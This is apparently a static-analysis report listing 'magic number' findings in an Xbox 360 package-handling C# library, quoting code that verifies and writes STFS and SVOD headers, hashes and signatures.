Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: try {  	List<Verified> xReturn = new List<Verified> ();  	// Verifies master hash with currently written header  	AddToLog ("Verifying Master hash");  	xIO.Position = 0x395;  	xIO.IsBigEndian = true;  	int xBlockCount = xIO.ReadInt32 ();  	long xLocale = 0;  	if (xBlockCount <= Constants.BlockLevel [0])  		xLocale = GenerateBaseOffset (0' 0);  	else if (xBlockCount <= Constants.BlockLevel [1])  		xLocale = GenerateBaseOffset (0' TreeLevel.L1);  	else  		xLocale = GenerateBaseOffset (0' TreeLevel.L2);  	xIO.Position = 0x381;  	byte[] xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Master' XVerifyHash (xLocale' 0x1000' ref xHash)' xLocale' (0x381)));  	// Verifies currently written header  	AddToLog ("Verifying Header hash");  	int xSize = 0;  	if (xSTFSStruct.BaseBlock == 0xA000)  		xSize = 0x9CBC;  	else  		xSize = 0xACBC;  	// b000  	xIO.Position = 0x32C;  	xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Header' XVerifyHash (0x344' xSize' ref xHash)' 0x344' 0x32C));  	switch (xHeader.Magic) {  	case PackageMagic.CON: {  		// Verifies Certificate  		AddToLog ("Verifying Certificate");  		RSAParameters xRSAKeyz = new RSAParameters ();  		xRSAKeyz.Exponent = new byte[] {  			0'  			0'  			0'  			3  		};  		xRSAKeyz.Modulus = global::X360.Properties.Resources.XK6;  		xIO.Position = 4;  		byte[] xCert = xIO.ReadBytes (0xA8);  		byte[] xSig = xIO.ReadBytes (0x100);  		xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  		xReturn.Add (VerifySignature (false));  		// Doesn't matter' same thing for CON  		xActive = false;  		return xReturn.ToArray ();  	}  	default: {  		xReturn.Add (VerifySignature (false));  		xReturn.Add (VerifySignature (true));  		xActive = false;  		return xReturn.ToArray ();  	}  	}  }  catch {  	xActive = false;  	throw STFSExcepts.General;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: try {  	List<Verified> xReturn = new List<Verified> ();  	// Verifies master hash with currently written header  	AddToLog ("Verifying Master hash");  	xIO.Position = 0x395;  	xIO.IsBigEndian = true;  	int xBlockCount = xIO.ReadInt32 ();  	long xLocale = 0;  	if (xBlockCount <= Constants.BlockLevel [0])  		xLocale = GenerateBaseOffset (0' 0);  	else if (xBlockCount <= Constants.BlockLevel [1])  		xLocale = GenerateBaseOffset (0' TreeLevel.L1);  	else  		xLocale = GenerateBaseOffset (0' TreeLevel.L2);  	xIO.Position = 0x381;  	byte[] xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Master' XVerifyHash (xLocale' 0x1000' ref xHash)' xLocale' (0x381)));  	// Verifies currently written header  	AddToLog ("Verifying Header hash");  	int xSize = 0;  	if (xSTFSStruct.BaseBlock == 0xA000)  		xSize = 0x9CBC;  	else  		xSize = 0xACBC;  	// b000  	xIO.Position = 0x32C;  	xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Header' XVerifyHash (0x344' xSize' ref xHash)' 0x344' 0x32C));  	switch (xHeader.Magic) {  	case PackageMagic.CON: {  		// Verifies Certificate  		AddToLog ("Verifying Certificate");  		RSAParameters xRSAKeyz = new RSAParameters ();  		xRSAKeyz.Exponent = new byte[] {  			0'  			0'  			0'  			3  		};  		xRSAKeyz.Modulus = global::X360.Properties.Resources.XK6;  		xIO.Position = 4;  		byte[] xCert = xIO.ReadBytes (0xA8);  		byte[] xSig = xIO.ReadBytes (0x100);  		xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  		xReturn.Add (VerifySignature (false));  		// Doesn't matter' same thing for CON  		xActive = false;  		return xReturn.ToArray ();  	}  	default: {  		xReturn.Add (VerifySignature (false));  		xReturn.Add (VerifySignature (true));  		xActive = false;  		return xReturn.ToArray ();  	}  	}  }  catch {  	xActive = false;  	throw STFSExcepts.General;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: try {  	List<Verified> xReturn = new List<Verified> ();  	// Verifies master hash with currently written header  	AddToLog ("Verifying Master hash");  	xIO.Position = 0x395;  	xIO.IsBigEndian = true;  	int xBlockCount = xIO.ReadInt32 ();  	long xLocale = 0;  	if (xBlockCount <= Constants.BlockLevel [0])  		xLocale = GenerateBaseOffset (0' 0);  	else if (xBlockCount <= Constants.BlockLevel [1])  		xLocale = GenerateBaseOffset (0' TreeLevel.L1);  	else  		xLocale = GenerateBaseOffset (0' TreeLevel.L2);  	xIO.Position = 0x381;  	byte[] xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Master' XVerifyHash (xLocale' 0x1000' ref xHash)' xLocale' (0x381)));  	// Verifies currently written header  	AddToLog ("Verifying Header hash");  	int xSize = 0;  	if (xSTFSStruct.BaseBlock == 0xA000)  		xSize = 0x9CBC;  	else  		xSize = 0xACBC;  	// b000  	xIO.Position = 0x32C;  	xHash = xIO.ReadBytes (20);  	xReturn.Add (new Verified (ItemType.Header' XVerifyHash (0x344' xSize' ref xHash)' 0x344' 0x32C));  	switch (xHeader.Magic) {  	case PackageMagic.CON: {  		// Verifies Certificate  		AddToLog ("Verifying Certificate");  		RSAParameters xRSAKeyz = new RSAParameters ();  		xRSAKeyz.Exponent = new byte[] {  			0'  			0'  			0'  			3  		};  		xRSAKeyz.Modulus = global::X360.Properties.Resources.XK6;  		xIO.Position = 4;  		byte[] xCert = xIO.ReadBytes (0xA8);  		byte[] xSig = xIO.ReadBytes (0x100);  		xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  		xReturn.Add (VerifySignature (false));  		// Doesn't matter' same thing for CON  		xActive = false;  		return xReturn.ToArray ();  	}  	default: {  		xReturn.Add (VerifySignature (false));  		xReturn.Add (VerifySignature (true));  		xActive = false;  		return xReturn.ToArray ();  	}  	}  }  catch {  	xActive = false;  	throw STFSExcepts.General;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: xHash = xIO.ReadBytes (20);  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: switch (xHeader.Magic) {  case PackageMagic.CON: {  	// Verifies Certificate  	AddToLog ("Verifying Certificate");  	RSAParameters xRSAKeyz = new RSAParameters ();  	xRSAKeyz.Exponent = new byte[] {  		0'  		0'  		0'  		3  	};  	xRSAKeyz.Modulus = global::X360.Properties.Resources.XK6;  	xIO.Position = 4;  	byte[] xCert = xIO.ReadBytes (0xA8);  	byte[] xSig = xIO.ReadBytes (0x100);  	xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  	xReturn.Add (VerifySignature (false));  	// Doesn't matter' same thing for CON  	xActive = false;  	return xReturn.ToArray ();  }  default: {  	xReturn.Add (VerifySignature (false));  	xReturn.Add (VerifySignature (true));  	xActive = false;  	return xReturn.ToArray ();  }  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: switch (xHeader.Magic) {  case PackageMagic.CON: {  	// Verifies Certificate  	AddToLog ("Verifying Certificate");  	RSAParameters xRSAKeyz = new RSAParameters ();  	xRSAKeyz.Exponent = new byte[] {  		0'  		0'  		0'  		3  	};  	xRSAKeyz.Modulus = global::X360.Properties.Resources.XK6;  	xIO.Position = 4;  	byte[] xCert = xIO.ReadBytes (0xA8);  	byte[] xSig = xIO.ReadBytes (0x100);  	xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  	xReturn.Add (VerifySignature (false));  	// Doesn't matter' same thing for CON  	xActive = false;  	return xReturn.ToArray ();  }  default: {  	xReturn.Add (VerifySignature (false));  	xReturn.Add (VerifySignature (true));  	xActive = false;  	return xReturn.ToArray ();  }  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: switch (xHeader.Magic) {  case PackageMagic.CON: {  	// Verifies Certificate  	AddToLog ("Verifying Certificate");  	RSAParameters xRSAKeyz = new RSAParameters ();  	xRSAKeyz.Exponent = new byte[] {  		0'  		0'  		0'  		3  	};  	xRSAKeyz.Modulus = global::X360.Properties.Resources.XK6;  	xIO.Position = 4;  	byte[] xCert = xIO.ReadBytes (0xA8);  	byte[] xSig = xIO.ReadBytes (0x100);  	xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  	xReturn.Add (VerifySignature (false));  	// Doesn't matter' same thing for CON  	xActive = false;  	return xReturn.ToArray ();  }  default: {  	xReturn.Add (VerifySignature (false));  	xReturn.Add (VerifySignature (true));  	xActive = false;  	return xReturn.ToArray ();  }  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: xRSAKeyz.Exponent = new byte[] {  	0'  	0'  	0'  	3  };  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: xIO.Position = 4;  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The following statement contains a magic number: xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC));  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,MakeFile,The following statement contains a magic number: if (z == null) {  	if (xFileDirectory.Count + xFolderDirectory.Count + 1 >= 65535)  		return (xActive = false);  	return xAddFile (xIOIn' file' parent.FolderPointer);  }  else if (xType == AddType.Inject)  	return z.xInject (xIOIn);  else  	return z.xReplace (xIOIn);  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,MakeFile,The following statement contains a magic number: if (xFileDirectory.Count + xFolderDirectory.Count + 1 >= 65535)  	return (xActive = false);  
Magic Number,X360.STFS,ThemeParams,C:\repos\mtolly_X360\X360\X360\STFS\Create.cs,ThemeParams,The following statement contains a magic number: AvatarLightingDirectional0 = (decimal)-0.5;  
Magic Number,X360.STFS,ThemeParams,C:\repos\mtolly_X360\X360\X360\STFS\Create.cs,ThemeParams,The following statement contains a magic number: AvatarLightingDirectional1 = (decimal)-0.6123;  
Magic Number,X360.STFS,CreateSTFS,C:\repos\mtolly_X360\X360\X360\STFS\Create.cs,AddFile,The following statement contains a magic number: if (UppedDirectCount >= 0x3FF || UppedTotalBlocks (CreateTools.BlockCount (FileLocation)) > BlockStep [2] || FilePath == null || FilePath == "")  	return false;  
Magic Number,X360.STFS,ProfilePackage,C:\repos\mtolly_X360\X360\X360\Profile\ProfilePackage.cs,LoadProfile,The following statement contains a magic number: if (xboth) {  	FileEntry xacct = GetFile ("Account");  	if (xacct != null && xacct.Size == 404) {  		if (HasValidAccount)  			xUserFile.IO.Dispose ();  		AddToLog ("Parsing Account file");  		DJsIO xAcctIO = xacct.GetTempIO (true);  		if (xAcctIO == null || !xAcctIO.Accessed) {  			if (xAcctIO != null) {  				xAcctIO.Dispose ();  				VariousFunctions.DeleteFile (xAcctIO.FileNameLong);  			}  		}  		else {  			xUserFile = new UserAccount (xAcctIO' AccountType.Stock' true);  			xreturn = xUserFile.Success;  			if (!xUserFile.Success) {  				xUserFile = new UserAccount (xAcctIO' AccountType.Kits' true);  				xreturn = xUserFile.Success;  				if (!xUserFile.Success)  					xUserFile = null;  			}  		}  	}  }  
Magic Number,X360.STFS,ProfilePackage,C:\repos\mtolly_X360\X360\X360\Profile\ProfilePackage.cs,LoadProfile,The following statement contains a magic number: if (xacct != null && xacct.Size == 404) {  	if (HasValidAccount)  		xUserFile.IO.Dispose ();  	AddToLog ("Parsing Account file");  	DJsIO xAcctIO = xacct.GetTempIO (true);  	if (xAcctIO == null || !xAcctIO.Accessed) {  		if (xAcctIO != null) {  			xAcctIO.Dispose ();  			VariousFunctions.DeleteFile (xAcctIO.FileNameLong);  		}  	}  	else {  		xUserFile = new UserAccount (xAcctIO' AccountType.Stock' true);  		xreturn = xUserFile.Success;  		if (!xUserFile.Success) {  			xUserFile = new UserAccount (xAcctIO' AccountType.Kits' true);  			xreturn = xUserFile.Success;  			if (!xUserFile.Success)  				xUserFile = null;  		}  	}  }  
Magic Number,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,XLoadCON,The following statement contains a magic number: xK.Exponent = xKV.ReadBytes (4);  
Magic Number,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The following statement contains a magic number: xK.Exponent = new byte[] {  	0'  	0'  	0'  	3  };  
Magic Number,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The following statement contains a magic number: try {  	string outlocale = OutLocation.Replace ('\\'' '/');  	if (outlocale [outlocale.Length - 1] == '/')  		outlocale = outlocale.Substring (0' outlocale.Length - 1);  	outlocale += '/' + ((uint)ContentType).ToString ("X8");  	string DataFolder = outlocale + "/" + xHeader.TitleID.ToString ("X8") + ".data";  	if (!VariousFunctions.xCheckDirectory (OutLocation))  		throw IOExcepts.CreateError;  	if (!VariousFunctions.xCheckDirectory (DataFolder))  		throw IOExcepts.CreateError;  	uint xBlockCount = 0;  	uint xDataFileCount = 0;  	long xDataLength = 0;  	BaseImage.xIO.Position = BaseImage.baseoffset;  	while (BaseImage.xIO.Position < BaseImage.xIO.Length) {  		if ((xBlockCount % Constants.SVODBL [1]) == 0) {  			if (x != null) {  				for (int i = 0; i < 0xCB; i++) {  					x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 0);  					byte[] Data1 = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  					x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 1);  					x.Write (Data1);  				}  				x.Flush ();  				xDataLength += x.Length;  				x.Close ();  			}  			x = new DJsIO (DataFolder + SVODFuncs.formatstring (xDataFileCount)' DJFileMode.Create' true);  			xDataFileCount++;  		}  		x.Position = SVODFuncs.GenerateDataOffset (xBlockCount);  		byte[] Data = BaseImage.xIO.ReadBytes (0x1000);  		x.Write (Data);  		x.Position = SVODFuncs.GenerateHashOffset (xBlockCount' 0);  		x.Write (SHA1Quick.ComputeHash (Data));  		xBlockCount++;  	}  	if (xBlockCount == 0) {  		x.Close ();  		return (xActive = false);  	}  	x.Flush ();  	xDataLength += x.Length;  	int lvlct = (int)((((xBlockCount % Constants.SVODBL [1]) - 1) / Constants.SVODBL [0]) + 1);  	for (int i = 0; i < lvlct; i++) {  		x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 0);  		byte[] Data1 = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  		x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 1);  		x.Write (Data1);  	}  	x.Flush ();  	x.Close ();  	byte[] Hash = null;  	for (int i = (int)(xDataFileCount - 1); i >= 0; i--) {  		x = new DJsIO (DataFolder + SVODFuncs.formatstring ((uint)i)' DJFileMode.Open' true);  		if (Hash != null) {  			x.Position = 0xFF0;  			x.Write (Hash);  			x.Flush ();  		}  		x.Position = 0;  		Hash = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  	}  	xHeader.DataFileSize = xDataLength;  	xHeader.DataFileCount = xDataFileCount;  	xHeader.xThisType = ContentType;  	h = new DJsIO (outlocale + "/" + xHeader.TitleID.ToString ("X8")' DJFileMode.Create' true);  	xHeader.Write (ref h);  	h.SetLength (0xB000);  	h.Position = 0x340;  	h.Write ((uint)0xAD0E);  	h.Position = 0x379;  	h.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	h.Write (Hash);  	h.Write ((byte)((Deviation == 0) ? 0 : 0x40));  	h.WriteUInt24 (xBlockCount);  	h.Write (Deviation' false);  	h.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (h.ReadBytes ((int)(h.Length - 0x344)));  	h.Position = 0x32C;  	h.Write (xHash);  	h.Flush ();  	h.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (h.ReadBytes (0x118));  	h.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		h.Write (xParams.Certificate);  		h.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		h.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		h.Write (new byte[0x128]);  	}  	h.IsBigEndian = true;  	h.Position = 0;  	h.Write (((uint)xParams.Type));  	xHeader.xMagic = xParams.Type;  	h.Flush ();  	h.Close ();  	return !(xActive = false);  }  catch {  	if (x != null)  		x.Close ();  	if (h != null)  		h.Close ();  	return (xActive = false);  }  
Magic Number,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The following statement contains a magic number: try {  	string outlocale = OutLocation.Replace ('\\'' '/');  	if (outlocale [outlocale.Length - 1] == '/')  		outlocale = outlocale.Substring (0' outlocale.Length - 1);  	outlocale += '/' + ((uint)ContentType).ToString ("X8");  	string DataFolder = outlocale + "/" + xHeader.TitleID.ToString ("X8") + ".data";  	if (!VariousFunctions.xCheckDirectory (OutLocation))  		throw IOExcepts.CreateError;  	if (!VariousFunctions.xCheckDirectory (DataFolder))  		throw IOExcepts.CreateError;  	uint xBlockCount = 0;  	uint xDataFileCount = 0;  	long xDataLength = 0;  	BaseImage.xIO.Position = BaseImage.baseoffset;  	while (BaseImage.xIO.Position < BaseImage.xIO.Length) {  		if ((xBlockCount % Constants.SVODBL [1]) == 0) {  			if (x != null) {  				for (int i = 0; i < 0xCB; i++) {  					x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 0);  					byte[] Data1 = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  					x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 1);  					x.Write (Data1);  				}  				x.Flush ();  				xDataLength += x.Length;  				x.Close ();  			}  			x = new DJsIO (DataFolder + SVODFuncs.formatstring (xDataFileCount)' DJFileMode.Create' true);  			xDataFileCount++;  		}  		x.Position = SVODFuncs.GenerateDataOffset (xBlockCount);  		byte[] Data = BaseImage.xIO.ReadBytes (0x1000);  		x.Write (Data);  		x.Position = SVODFuncs.GenerateHashOffset (xBlockCount' 0);  		x.Write (SHA1Quick.ComputeHash (Data));  		xBlockCount++;  	}  	if (xBlockCount == 0) {  		x.Close ();  		return (xActive = false);  	}  	x.Flush ();  	xDataLength += x.Length;  	int lvlct = (int)((((xBlockCount % Constants.SVODBL [1]) - 1) / Constants.SVODBL [0]) + 1);  	for (int i = 0; i < lvlct; i++) {  		x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 0);  		byte[] Data1 = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  		x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 1);  		x.Write (Data1);  	}  	x.Flush ();  	x.Close ();  	byte[] Hash = null;  	for (int i = (int)(xDataFileCount - 1); i >= 0; i--) {  		x = new DJsIO (DataFolder + SVODFuncs.formatstring ((uint)i)' DJFileMode.Open' true);  		if (Hash != null) {  			x.Position = 0xFF0;  			x.Write (Hash);  			x.Flush ();  		}  		x.Position = 0;  		Hash = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  	}  	xHeader.DataFileSize = xDataLength;  	xHeader.DataFileCount = xDataFileCount;  	xHeader.xThisType = ContentType;  	h = new DJsIO (outlocale + "/" + xHeader.TitleID.ToString ("X8")' DJFileMode.Create' true);  	xHeader.Write (ref h);  	h.SetLength (0xB000);  	h.Position = 0x340;  	h.Write ((uint)0xAD0E);  	h.Position = 0x379;  	h.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	h.Write (Hash);  	h.Write ((byte)((Deviation == 0) ? 0 : 0x40));  	h.WriteUInt24 (xBlockCount);  	h.Write (Deviation' false);  	h.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (h.ReadBytes ((int)(h.Length - 0x344)));  	h.Position = 0x32C;  	h.Write (xHash);  	h.Flush ();  	h.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (h.ReadBytes (0x118));  	h.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		h.Write (xParams.Certificate);  		h.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		h.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		h.Write (new byte[0x128]);  	}  	h.IsBigEndian = true;  	h.Position = 0;  	h.Write (((uint)xParams.Type));  	xHeader.xMagic = xParams.Type;  	h.Flush ();  	h.Close ();  	return !(xActive = false);  }  catch {  	if (x != null)  		x.Close ();  	if (h != null)  		h.Close ();  	return (xActive = false);  }  
Magic Number,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The following statement contains a magic number: try {  	string outlocale = OutLocation.Replace ('\\'' '/');  	if (outlocale [outlocale.Length - 1] == '/')  		outlocale = outlocale.Substring (0' outlocale.Length - 1);  	outlocale += '/' + ((uint)ContentType).ToString ("X8");  	string DataFolder = outlocale + "/" + xHeader.TitleID.ToString ("X8") + ".data";  	if (!VariousFunctions.xCheckDirectory (OutLocation))  		throw IOExcepts.CreateError;  	if (!VariousFunctions.xCheckDirectory (DataFolder))  		throw IOExcepts.CreateError;  	uint xBlockCount = 0;  	uint xDataFileCount = 0;  	long xDataLength = 0;  	BaseImage.xIO.Position = BaseImage.baseoffset;  	while (BaseImage.xIO.Position < BaseImage.xIO.Length) {  		if ((xBlockCount % Constants.SVODBL [1]) == 0) {  			if (x != null) {  				for (int i = 0; i < 0xCB; i++) {  					x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 0);  					byte[] Data1 = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  					x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 1);  					x.Write (Data1);  				}  				x.Flush ();  				xDataLength += x.Length;  				x.Close ();  			}  			x = new DJsIO (DataFolder + SVODFuncs.formatstring (xDataFileCount)' DJFileMode.Create' true);  			xDataFileCount++;  		}  		x.Position = SVODFuncs.GenerateDataOffset (xBlockCount);  		byte[] Data = BaseImage.xIO.ReadBytes (0x1000);  		x.Write (Data);  		x.Position = SVODFuncs.GenerateHashOffset (xBlockCount' 0);  		x.Write (SHA1Quick.ComputeHash (Data));  		xBlockCount++;  	}  	if (xBlockCount == 0) {  		x.Close ();  		return (xActive = false);  	}  	x.Flush ();  	xDataLength += x.Length;  	int lvlct = (int)((((xBlockCount % Constants.SVODBL [1]) - 1) / Constants.SVODBL [0]) + 1);  	for (int i = 0; i < lvlct; i++) {  		x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 0);  		byte[] Data1 = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  		x.Position = SVODFuncs.GenerateHashOffset ((uint)(i * Constants.SVODBL [0])' 1);  		x.Write (Data1);  	}  	x.Flush ();  	x.Close ();  	byte[] Hash = null;  	for (int i = (int)(xDataFileCount - 1); i >= 0; i--) {  		x = new DJsIO (DataFolder + SVODFuncs.formatstring ((uint)i)' DJFileMode.Open' true);  		if (Hash != null) {  			x.Position = 0xFF0;  			x.Write (Hash);  			x.Flush ();  		}  		x.Position = 0;  		Hash = SHA1Quick.ComputeHash (x.ReadBytes (0x1000));  	}  	xHeader.DataFileSize = xDataLength;  	xHeader.DataFileCount = xDataFileCount;  	xHeader.xThisType = ContentType;  	h = new DJsIO (outlocale + "/" + xHeader.TitleID.ToString ("X8")' DJFileMode.Create' true);  	xHeader.Write (ref h);  	h.SetLength (0xB000);  	h.Position = 0x340;  	h.Write ((uint)0xAD0E);  	h.Position = 0x379;  	h.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	h.Write (Hash);  	h.Write ((byte)((Deviation == 0) ? 0 : 0x40));  	h.WriteUInt24 (xBlockCount);  	h.Write (Deviation' false);  	h.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (h.ReadBytes ((int)(h.Length - 0x344)));  	h.Position = 0x32C;  	h.Write (xHash);  	h.Flush ();  	h.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (h.ReadBytes (0x118));  	h.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		h.Write (xParams.Certificate);  		h.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		h.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		h.Write (new byte[0x128]);  	}  	h.IsBigEndian = true;  	h.Position = 0;  	h.Write (((uint)xParams.Type));  	xHeader.xMagic = xParams.Type;  	h.Flush ();  	h.Close ();  	return !(xActive = false);  }  catch {  	if (x != null)  		x.Close ();  	if (h != null)  		h.Close ();  	return (xActive = false);  }  
Magic Number,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The following statement contains a magic number: h.Write (new byte[] {  	0x24'  	5'  	5'  	0x11  });  
Magic Number,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The following statement contains a magic number: h.Write (new byte[] {  	0x24'  	5'  	5'  	0x11  });  
Magic Number,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The following statement contains a magic number: h.Position = 4;  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,SVODPackage,The following statement contains a magic number: if (xHeaderIO.ReadByte () != 0x24 && xHeaderIO.ReadByte () != 5 && xHeaderIO.ReadByte () != 5 && xHeaderIO.ReadByte () != 0x11)  	return;  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,SVODPackage,The following statement contains a magic number: if (xHeaderIO.ReadByte () != 0x24 && xHeaderIO.ReadByte () != 5 && xHeaderIO.ReadByte () != 5 && xHeaderIO.ReadByte () != 0x11)  	return;  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,SVODPackage,The following statement contains a magic number: xIsShifted = (((xHeaderIO.ReadByte () >> 6) & 1) == 1);  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,SVODPackage,The following statement contains a magic number: if (xDataFiles.Length > 9999 || xDataFiles.Length == 0)  	throw SVODExcepts.Count;  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: try {  	DJsIO xio = new DJsIO (true);  	xHeaderData.Write (ref xio);  	xio.SetLength (0xB000);  	xio.Position = 0x340;  	xio.Write ((uint)0xAD0E);  	xio.Position = 0x379;  	xio.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	IO.Position = 0x37D;  	xio.Write (IO.ReadBytes (20));  	xio.Write ((byte)((xIsShifted ? 1 : 0) << 6));  	xio.WriteUInt24 (xBlockCount);  	xio.Write (xDeviation);  	xio.Flush ();  	xio.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (xio.ReadBytes ((int)(xio.Length - 0x344)));  	xio.Position = 0x32C;  	xio.Write (xHash);  	xio.Flush ();  	xio.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (xio.ReadBytes (0x118));  	xio.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		xio.Write (xParams.Certificate);  		xio.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		xio.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		xio.Write (new byte[0x128]);  	}  	xio.IsBigEndian = true;  	xio.Position = 0;  	xio.Write (((uint)xParams.Type));  	xio.Flush ();  	xHeaderData.xMagic = xParams.Type;  	IO.Position = 0;  	IO.Write (xio.ReadStream ());  	IO.Flush ();  	xio.Dispose ();  	return true;  }  catch {  	return false;  }  
